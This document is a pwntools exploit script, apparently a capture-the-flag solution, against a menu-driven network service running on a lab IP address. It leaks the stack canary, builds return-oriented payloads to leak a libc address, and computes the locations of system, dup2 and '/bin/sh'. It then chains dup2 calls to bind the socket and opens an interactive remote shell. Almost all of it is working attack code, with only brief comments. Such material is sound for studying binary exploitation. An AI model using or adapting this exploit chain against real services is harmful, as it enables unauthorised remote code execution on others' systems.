from pwn import *

context.log_level = 'debug'
io = remote('192.168.56.103', 8181)
io.recvuntil('3. Exit\n')
io.sendline('1')
io.recvuntil('Input Your Message : ')
io.sendline('1' * 40)
io.recvuntil('1' * 40)
canary = u32(io.recvn(4)) - 0x0a
log.info('canary : ' + hex(canary))

io.recvuntil('3. Exit\n')
io.sendline('1')
io.recvuntil('Input Your Message : ')
pay = '/bin/sh\x00'
pay = pay.ljust(40, '\x00')
pay += p32(canary)
pay = pay.ljust(0x38, '\x00')
pay += p32(0x80488b1)
pay += p32(0x8048a71)
pay += p32(0x804b050)
io.send(pay)
io.recvuntil('3. Exit\n')
io.sendline('3')
io.recvuntil('Select menu > ')
atoi_addr = u32(io.recvn(4))
log.info('atoi addr : ' + hex(atoi_addr))
system_addr = atoi_addr - 185584 + 242016
dup2_addr = atoi_addr - 185584 + 893120
bin_sh_addr = atoi_addr - 185584 + 1439195
log.info('system_addr : ' + hex(system_addr))

io.recvuntil('3. Exit\n')
io.sendline('1')
io.recvuntil('Input Your Message : ')
#when we use /bin/sh str on the stack, it will be cleared because of the stack operations
#that will cause sh -c NULL
#so we need to use bin_sh str in libc
pay = '/bin/sh\x00'
pay = pay.ljust(40, '1')
pay += p32(canary)
pay = pay.ljust(0x38, '2')
pay += p32(dup2_addr)
pay += p32(0x08048b84)
pay += p32(4)
pay += p32(0)
pay += p32(dup2_addr)
pay += p32(0x08048b84)
pay += p32(4)
pay += p32(1)
pay += p32(0x8048620)
pay += p32(0xdeadbeef)
pay += p32(bin_sh_addr)
io.send(pay)

io.recvuntil('3. Exit\n')
io.sendline('3')
io.interactive()

#an esay problem, the only important point is that we should use dup2 to redirect sock opt 

